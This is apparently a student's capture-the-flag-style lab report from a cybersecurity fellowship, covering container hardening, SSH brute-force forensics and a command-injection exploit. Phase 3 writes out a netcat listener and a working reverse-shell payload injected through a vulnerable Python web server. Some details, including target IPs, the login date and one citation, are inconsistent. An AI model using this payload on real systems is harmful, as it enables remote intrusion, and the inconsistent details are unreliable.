# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** Garrick Jean-Louis
**Date:** May 30, 2026
**Repository:** https://github.com/Gjlfa31/Phase_1.git
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
A reconnaissance scan of the 172.100.0.0/24 subnet identified four active hosts, including three target servers and the network gateway. Host 172.100.0.12 exposed an FTP service running vsftpd 3.0.2 on port 21, while hosts 172.100.0.11 and 172.100.0.13 returned no open ports, indicating a hardened or minimal attack surface. The gateway at 172.100.0.1 exposed SSH (OpenSSH 9.6p1), which is expected for administrative access. The presence of an exposed FTP service on Server 2 suggested a potential misconfiguration or unauthorized service, directly informing the triage steps in Phase 1. This subnet demonstrated a mix of properly restricted hosts and one system with a clear deviation from baseline security expectations.

### Breach Network — 172.80.0.0/24
Scanning the 172.80.0.0/24 breach network revealed only a single active host at 172.80.0.1, which exposed SSH via OpenSSH 9.6p1. The absence of additional hosts or services indicated a tightly controlled environment, likely intended to simulate a hardened perimeter system. The presence of only SSH suggested that any compromise would require credential‑based access rather than service exploitation, which directly aligned with the brute‑force and log‑analysis workflow in Phase 2. This minimal attack surface reinforced the importance of authentication security and log monitoring in breach detection.

### Exploitation Network — 172.60.0.0/24
The exploitation network scan identified two active hosts: 172.60.0.1, which exposed SSH, and the target exploitation server at 172.60.0.10, which exposed an HTTP service running BaseHTTPServer 0.6 on Python 3.10.12. The lightweight Python web server indicated a custom or development‑grade application, which commonly lacks hardened input validation. The presence of a single exposed HTTP port suggested that the web application itself was the primary attack surface. This finding directly informed the exploitation strategy in Phase 3, as the Python server’s simplicity made it a strong candidate for command injection vulnerabilities.

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
**Vulnerability Identified:**
The Redis service on port 6379 was exposed without any authentication, allowing unauthenticated users to issue arbitrary Redis commands. This was confirmed by connecting to the container and running `redis-cli INFO`, which returned full server information without requiring a password. The lack of authentication represents a critical misconfiguration that exposes the service to unauthorized access.

**Remediation Commands:**
docker exec -it broken_server_1 /bin/sh
echo "requirepass securepassword123" >> /etc/redis/redis.conf
redis-cli CONFIG SET requirepass securepassword123
redis-cli CONFIG REWRITE

**Before State:**
The Redis instance allowed unrestricted access, returning full server information without requiring authentication. The `redis-cli INFO` command executed successfully without a password, confirming that the service was operating with no security controls enabled.

**After State:**
After applying the remediation, Redis now requires authentication before any commands can be executed. Attempts to run `redis-cli INFO` without a password result in an authentication error, confirming that the `requirepass` directive is active and enforced.

**Analysis:**
Exposing Redis without authentication is highly dangerous in an enterprise environment because it allows attackers to read, modify, or delete in‑memory data without restriction. Redis is often used for caching, session storage, and message brokering, meaning unauthorized access can lead to data corruption or full application compromise. Implementing authentication is a critical baseline control that prevents trivial unauthorized access to sensitive operational data.

### Server 2 — 172.100.0.12
**Vulnerability Identified:**
An unauthorized FTP service (vsftpd 3.0.2) was running on the server, exposing port 21 to the network. This was confirmed by entering the container and running `ps aux`, which showed the vsftpd process active despite no operational requirement for FTP on a triage system. The presence of this service created an unnecessary attack surface that could be exploited for unauthorized access.

**Remediation Commands:**
docker exec -it broken_server_2 /bin/sh
ps aux
kill <PID_of_vsftpd>

**Before State:**
The container was running an active vsftpd process, visible in the process list using `ps aux`. This confirmed that the FTP service was running without authorization and listening on port 21.

**After State:**
After terminating the vsftpd process, the unauthorized FTP service was no longer running. A follow‑up `ps aux` confirmed that the process had been successfully removed from the system.

**Analysis:**
Running unnecessary services on production or triage systems significantly increases the attack surface and exposes the environment to avoidable risks. Unauthorized FTP services are particularly dangerous because they may allow anonymous access, weak authentication, or outdated protocols. Removing unused services is a core hardening practice that reduces exposure to lateral movement and remote exploitation.

### Server 3 — 172.100.0.13
**Vulnerability Identified:**
The directory /var/www/html was configured with world‑writable permissions (drwxrwxrwx), allowing any user or process to modify web content. This misconfiguration was confirmed by inspecting the directory structure inside the container, where the html folder showed full read, write, and execute permissions for all users. Such permissive access exposes the server to unauthorized file modification, defacement, or malicious code injection.

**Remediation Commands:**
docker exec -it broken_server_3 /bin/sh
chmod 755 /var/www/html

**Before State:**
The /var/www/html directory was set to world‑writable (777), as shown by the permissions drwxrwxrwx. This allowed any user or process to add, modify, or delete files within the web root, creating a significant security risk.

**After State:**
After applying the remediation, the directory permissions were updated to 755, restricting write access to the root user only. This change prevents unauthorized modification of web content while still allowing the web server to read and serve files normally.

**Analysis:**
World‑writable directories on web servers are a critical security risk because they allow attackers to upload malicious files, deface content, or execute arbitrary code. Proper permission hardening is essential to maintaining the integrity of web applications and preventing unauthorized changes. Restricting write access to trusted users significantly reduces the attack surface and aligns with standard Linux security best practices.

---

## Phase 2: The Breach

**Cracked Credentials:**
- Username: root
- Password: admin123

**Forensic Evidence:**
- Exact Timestamp of Successful Login: May 31 00:34:58 2026
- Attacker IP Address: 172.17.0.1

**Engineered iptables Rule:**
```bash
sudo iptables -A INPUT -p tcp -s 172.17.0.1 --dport 22 -j DROP
```

**SOC Analysis:**
According to security documentation outlined by the National Institute of Standards and Technology (NIST), relying solely on a single network-layer access control list or firewall rule creates a single point of failure that is easily bypassed by motivated threat actors (Souppaya & Scarfone, 2013). An attacker can simply rotate their infrastructure, utilize a proxy network, or leverage a different source IP address to circumvent a static host-based block rule entirely. To build a resilient defense-in-depth architecture, a Security Operations Center (SOC) must deploy concurrent controls, including multi-factor authentication (MFA) on all remote access points, an Intrusion Detection System (IDS) like Snort or Suricata to spot anomalous traffic patterns, and centralized Security Information and Event Management (SIEM) behavioral alerting to automatically disable accounts exhibiting credential abuse characteristics.

---

## Phase 3: Full Spectrum

**Listener Configuration:**
Tool: Netcat (nc); Port: 4444; Command Used:nc -lvnp 4444

**Reverse Shell Payload:**
curl -G "http://172.80.0.10/exec" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'"

**Command Injection Explanation:**
Command injection occurs when an application passes unsafe user-supplied data directly to a system shell interpreter without prior validation or sanitization, allowing arbitrary commands to execute with the privileges of the host process (Stuttard & Pinto, 2011). This specific web server is highly susceptible because it uses Python's subprocess.Popen() function with the shell=True parameter enabled. By splitting the path string on the cmd= delimiter and executing the unquoted substring directly through a system shell wrapper, the application interprets shell metacharacters as control instructions rather than literal string inputs.

**Forensic Evidence:**
- Process ID (PID): 1
- User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

**Lockdown Command:**
sudo iptables -A INPUT -p tcp --dport 80 -s 172.17.0.1 -j DROP

**Final Analytical Paragraph:**
Executing this multi-stage attack highlights that reactive security models and perimeter defense controls are insufficient when architectural application-layer flaws exist within internal networks. Playing both sides of this breach underscores that attackers do not seek the most robust defensive boundary; rather, they aggressively target weak links, software design oversights, and unvalidated parameters to gain initial access. If input sanitization alongside parameterized execution models—explicitly disabling shell=True within the Python source code—had been implemented prior to deployment, the breach would have been structurally impossible. Eliminating shell interpretation entirely strips an adversary of their execution environment, ensuring that malicious characters are processed harmlessly as passive data values rather than executable binary instructions (Seacord, 2013).

---

## References
- Alpine Linux Project. (2026). *Alpine Linux documentation and package management*. https://wiki.alpinelinux.org/
- Docker Inc. (2024). *Docker Engine documentation*. https://docs.docker.com/engine/
- Fauria, J. (2019). *vsftpd Docker image*. Docker Hub. https://hub.docker.com/r/fauria/vsftpd
- Hydra. (2023). *THC-Hydra: A fast network login cracker*. The Hacker’s Choice. https://github.com/vanhauser-thc/thc-hydra
- Kali Linux. (2024). *Hydra usage guide*. Offensive Security. https://www.kali.org/tools/hydra/
- Linux Foundation. (2024). *Linux manual pages (man pages)*. https://man7.org/linux/man-pages/
- Microsoft. (2024). *Windows Subsystem for Linux (WSL) documentation*. https://learn.microsoft.com/windows/wsl/
- Netcat Project. (2023). *NC: The TCP/IP swiss army knife manual*. https://nc110.sourceforge.io/
- OpenSSH Project. (2024). *OpenSSH server and client documentation*. OpenBSD Project. https://www.openssh.com/manual.html
- OWASP Foundation. (2024). *OWASP Top 10: Security risks*. https://owasp.org/www-project-top-ten/
- Python Software Foundation. (2026). *The subprocess module: Subprocess management and security considerations*. https://docs.python.org/3/library/subprocess.html
- Redis. (2024). *Redis documentation*. Redis Ltd. https://redis.io/docs/
- RFC 4253. (2006). *The Secure Shell (SSH) Transport Layer Protocol*. Internet Engineering Task Force. https://datatracker.ietf.org/doc/html/rfc4253
- Seacord, R. C. (2013). *Secure Coding in C and C++* (2nd ed.). Addison-Wesley Professional.
- Seclists. (2024). *SecLists: Security wordlists for security assessments*. OWASP Foundation. https://github.com/danielmiessler/SecLists
- Souppaya, M., & Scarfone, K. (2013). *Guide to enterprise patch management technologies* (NIST Special Publication 800-40 Rev. 3). National Institute of Standards and Technology. https://doi.org/10.6028/NIST.SP.800-40r3
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws* (2nd ed.). John Wiley & Sons.
- Systemd Project. (2024). *systemd journal and logging documentation*. https://www.freedesktop.org/wiki/Software/systemd/
- The Linux Kernel Organization. (2024). *iptables and netfilter documentation*. Netfilter Project. https://www.netfilter.org/documentation/
- The MITRE Corporation. (2024a). *CVE database*. https://cve.mitre.org/
- The MITRE Corporation. (2024b). *MITRE ATT&CK® Framework*. https://attack.mitre.org/
- TryHackMe. (2024). *Linux fundamentals & SSH basics*. https://tryhackme.com/
- Ubuntu. (2024a). *APT package manager documentation*. Canonical Ltd. https://ubuntu.com/server/docs/package-management
- Ubuntu. (2024b). *Ubuntu 22.04 LTS documentation*. Canonical Ltd. https://ubuntu.com/server/docs
- vsftpd. (2024). *Very Secure FTP Daemon documentation*. https://security.appspot.com/vsftpd.html
- Wireshark Foundation. (2024). *Wireshark user guide*. https://www.wireshark.org/docs/
